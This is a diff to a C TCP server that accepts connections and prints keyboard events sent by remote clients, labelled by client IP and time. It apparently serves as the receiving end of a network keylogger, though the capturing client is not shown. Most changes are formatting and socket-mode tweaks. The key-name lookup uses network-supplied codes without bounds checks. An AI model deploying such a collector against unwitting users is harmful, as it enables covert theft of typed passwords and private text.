@@ -10,13 +10,14 @@
 #include <errno.h>
 #include <linux/input.h>
 #include <unistd.h>
+#include <fcntl.h>
 #include <string.h>
 #include <arpa/inet.h>
 
-#define RED   "\x1B[31m"
-#define YEL   "\x1B[33m"
-#define BLU   "\x1B[34m"
-#define GRN   "\x1B[32m"
+#define RED "\x1B[31m"
+#define YEL "\x1B[33m"
+#define BLU "\x1B[34m"
+#define GRN "\x1B[32m"
 #define RESET "\x1B[0m"
 
 #define SERVER_PORT 12345
@@ -26,9 +27,9 @@
 #define TRUE 1
 #define FALSE 0
 
-char *keycodes[249] = {"KEY_RESERVED", "KEY_ESC", "KEY_1", "KEY_2", "KEY_3", "KEY_4", "KEY_5", "KEY_6", "KEY_7", "KEY_8", "KEY_9", "KEY_0", "KEY_MINUS", "KEY_EQUAL", "KEY_BACKSPACE", "KEY_TAB", "KEY_Q", "KEY_W", "KEY_E", "KEY_R", "KEY_T", "KEY_Y", "KEY_U", "KEY_I", "KEY_O", "KEY_P", "KEY_LEFTBRACE", "KEY_RIGHTBRACE", "KEY_ENTER", "KEY_LEFTCTRL", "KEY_A", "KEY_S", "KEY_D", "KEY_F", "KEY_G", "KEY_H", "KEY_J", "KEY_K", "KEY_L", "KEY_SEMICOLON", "KEY_APOSTROPHE", "KEY_GRAVE", "KEY_LEFTSHIFT", "KEY_BACKSLASH", "KEY_Z", "KEY_X", "KEY_C", "KEY_V", "KEY_B", "KEY_N", "KEY_M", "KEY_COMMA", "KEY_DOT", "KEY_SLASH", "KEY_RIGHTSHIFT", "KEY_KPASTERISK", "KEY_LEFTALT", "KEY_SPACE", "KEY_CAPSLOCK", "KEY_F1", "KEY_F2", "KEY_F3", "KEY_F4", "KEY_F5", "KEY_F6", "KEY_F7", "KEY_F8", "KEY_F9", "KEY_F10", "KEY_NUMLOCK", "KEY_SCROLLLOCK", "KEY_KP7", "KEY_KP8", "KEY_KP9", "KEY_KPMINUS", "KEY_KP4", "KEY_KP5", "KEY_KP6", "KEY_KPPLUS", "KEY_KP1", "KEY_KP2", "KEY_KP3", "KEY_KP0", "KEY_KPDOT", "KEY_ZENKAKUHANKAKU", "KEY_102ND", "KEY_F11", "KEY_F12", "KEY_RO", "KEY_KATAKANA", "KEY_HIRAGANA", "KEY_HENKAN", "KEY_KATAKANAHIRAGANA", "KEY_MUHENKAN", "KEY_KPJPCOMMA", "KEY_KPENTER", "KEY_RIGHTCTRL", "KEY_KPSLASH", "KEY_SYSRQ", "KEY_RIGHTALT", "KEY_LINEFEED", "KEY_HOME", "KEY_UP", "KEY_PAGEUP", "KEY_LEFT", "KEY_RIGHT", "KEY_END", "KEY_DOWN", "KEY_PAGEDOWN", "KEY_INSERT", "KEY_DELETE", "KEY_MACRO", "KEY_MUTE", "KEY_VOLUMEDOWN", "KEY_VOLUMEUP", "KEY_POWER", "KEY_KPEQUAL", "KEY_KPPLUSMINUS", "KEY_PAUSE", "KEY_SCALE", "KEY_KPCOMMA", "KEY_HANGEUL", "KEY_HANGUEL", "KEY_HANJA", "KEY_YEN", "KEY_LEFTMETA", "KEY_RIGHTMETA",
-                       "KEY_COMPOSE", "KEY_STOP", "KEY_AGAIN", "KEY_PROPS", "KEY_UNDO", "KEY_FRONT", "KEY_COPY", "KEY_OPEN", "KEY_PASTE", "KEY_FIND", "KEY_CUT", "KEY_HELP", "KEY_MENU", "KEY_CALC", "KEY_SETUP", "KEY_SLEEP", "KEY_WAKEUP", "KEY_FILE", "KEY_SENDFILE", "KEY_DELETEFILE", "KEY_XFER", "KEY_PROG1", "KEY_PROG2", "KEY_WWW", "KEY_MSDOS", "KEY_COFFEE", "KEY_SCREENLOCK", "KEY_ROTATE_DISPLAY",
-                       "KEY_DIRECTION", "KEY_CYCLEWINDOWS", "KEY_MAIL", "KEY_BOOKMARKS", "KEY_COMPUTER", "KEY_BACK", "KEY_FORWARD", "KEY_CLOSECD", "KEY_EJECTCD", "KEY_EJECTCLOSECD", "KEY_NEXTSONG", "KEY_PLAYPAUSE", "KEY_PREVIOUSSONG", "KEY_STOPCD", "KEY_RECORD", "KEY_REWIND", "KEY_PHONE", "KEY_ISO", "KEY_CONFIG", "KEY_HOMEPAGE", "KEY_REFRESH", "KEY_EXIT", "KEY_MOVE", "KEY_EDIT", "KEY_SCROLLUP", "KEY_SCROLLDOWN", "KEY_KPLEFTPAREN", "KEY_KPRIGHTPAREN", "KEY_NEW", "KEY_REDO", "KEY_F13", "KEY_F14", "KEY_F15", "KEY_F16", "KEY_F17", "KEY_F18", "KEY_F19", "KEY_F20", "KEY_F21", "KEY_F22", "KEY_F23", "KEY_F24", "KEY_PLAYCD", "KEY_PAUSECD", "KEY_PROG3", "KEY_PROG4", "KEY_ALL_APPLICATIONS", "KEY_DASHBOARD", "KEY_SUSPEND", "KEY_CLOSE", "KEY_PLAY", "KEY_FASTFORWARD", "KEY_BASSBOOST", "KEY_PRINT", "KEY_HP", "KEY_CAMERA", "KEY_SOUND", "KEY_QUESTION", "KEY_EMAIL", "KEY_CHAT", "KEY_SEARCH", "KEY_CONNECT", "KEY_FINANCE", "KEY_SPORT", "KEY_SHOP", "KEY_ALTERASE", "KEY_CANCEL", "KEY_BRIGHTNESSDOWN", "KEY_BRIGHTNESSUP", "KEY_MEDIA", "KEY_SWITCHVIDEOMODE", "KEY_KBDILLUMTOGGLE", "KEY_KBDILLUMDOWN", "KEY_KBDILLUMUP", "KEY_SEND", "KEY_REPLY", "KEY_FORWARDMAIL", "KEY_SAVE", "KEY_DOCUMENTS", "KEY_BATTERY", "KEY_BLUETOOTH", "KEY_WLAN", "KEY_UWB", "KEY_UNKNOWN", "KEY_VIDEO_NEXT", "KEY_VIDEO_PREV", "KEY_BRIGHTNESS_CYCLE", "KEY_BRIGHTNESS_AUTO", "KEY_BRIGHTNESS_ZERO", "KEY_DISPLAY_OFF", "KEY_WWAN", "KEY_WIMAX", "KEY_RFKILL", "KEY_MICMUTE"};
+char *keycodes[249] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA", "HANGEUL", "HANGUEL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA",
+                       "COMPOSE", "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT", "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE", "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "SCREENLOCK", "ROTATE_DISPLAY",
+                       "DIRECTION", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD", "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN", "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "ALL_APPLICATIONS", "DASHBOARD", "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP", "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE", "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP", "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP", "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH", "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE", "BRIGHTNESS_AUTO", "BRIGHTNESS_ZERO", "DISPLAY_OFF", "WWAN", "WIMAX", "RFKILL", "MICMUTE"};
 
 int main(int argc, char **argv)
 {
@@ -48,18 +49,6 @@ int main(int argc, char **argv)
   /*Create listening tcp socket*/
   if ((listen_sd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
     perror("socket()"), exit(EXIT_FAILURE);
-
-  /*************************************************************/
-  /* Set socket to be nonblocking. All of the sockets for      */
-  /* the incoming connections will also be nonblocking since   */
-  /* they will inherit that state from the listening socket.   */
-  /*************************************************************/
-  if (ioctl(listen_sd, FIONBIO, (char *)&on) < 0)
-  {
-    perror("ioctl()");
-    close(listen_sd);
-    exit(EXIT_FAILURE);
-  }
 
   server_addr.sin_family = PF_INET;
   server_addr.sin_port = htons(SERVER_PORT);
@@ -92,7 +81,7 @@ int main(int argc, char **argv)
   /* Set up infinite poll timeout */
   timeout = -1;
 
-  printf(RED"Server is running..\n\n"RESET);
+  printf(RED "Server is running..\n\n" RESET);
   /* Accept new connections or read from ready sockets */
   do
   {
@@ -135,13 +124,17 @@ int main(int argc, char **argv)
             break;
           }
 
+          /* Put the socket in non-blocking mode */
+          if (fcntl(new_sd, F_SETFL, fcntl(new_sd, F_GETFL) | O_NONBLOCK) < 0)
+            perror("fcntl"), exit(EXIT_FAILURE);
+
           /* Add the new incoming connection to the pollfd struct */
           char *client_ip = inet_ntoa(client_addr.sin_addr);
           fds[nfds].fd = new_sd;
           fds[nfds].events = POLLIN;
           client_addresses[nfds] = malloc(strlen(client_ip) + 1);
           strncpy(client_addresses[nfds], client_ip, strlen(client_ip) + 1);
-          printf("New incoming connection "BLU"IP: %s - "GRN"fd: %d\n"RESET, client_ip, fds[nfds].fd);
+          printf("New incoming connection " BLU "IP: %s - " GRN "fd: %d\n\n" RESET, client_ip, fds[nfds].fd);
           nfds++;
 
         } while (new_sd != -1);
@@ -155,6 +148,7 @@ int main(int argc, char **argv)
         close_conn = FALSE;
         do
         {
+
           ssize_t bytes_read;
           if ((bytes_read = recv(fds[i].fd, kbd_events, MAX_KEYBOARD_EVENTS * event_size, 0)) < 0)
           {
@@ -168,7 +162,7 @@ int main(int argc, char **argv)
 
           /* Reading keyboard press events */
           for (ssize_t j = 0; j < bytes_read / event_size; j++)
-            printf(BLU"IP: %s - "YEL"Time: %ld - "RED"Key: %s\n"RESET, client_addresses[i], kbd_events[j].time.tv_sec, keycodes[kbd_events[j].code]);
+            printf(BLU "IP: %s - " YEL "Time: %ld - " RED "Key: %s\n" RESET, client_addresses[i], kbd_events[j].time.tv_sec, keycodes[kbd_events[j].code]);
 
           /*If client closed connection*/
           if (!bytes_read)
@@ -186,7 +180,7 @@ int main(int argc, char **argv)
         /* descriptor.                                         */
         if (close_conn)
         {
-          printf("Client closed connection ip: %s fd: %d\n", client_addresses[i], fds[i].fd);
+          printf("Closing connection with client. " BLU "IP: %s - " GRN "fd: %d\n\n" RESET, client_addresses[i], fds[i].fd);
           close(fds[i].fd);
           free(client_addresses[i]);
           fds[i].fd = -1;
@@ -223,11 +217,11 @@ int main(int argc, char **argv)
   /* Clean up all of the sockets that are open */
   for (int i = 0; i < nfds; i++)
   {
-      if (fds[i].fd >= 0)
-      {
-        close(fds[i].fd);
-        free(client_addresses[i]);
-      }
+    if (fds[i].fd >= 0)
+    {
+      close(fds[i].fd);
+      free(client_addresses[i]);
+    }
   }
 
   exit(EXIT_SUCCESS);
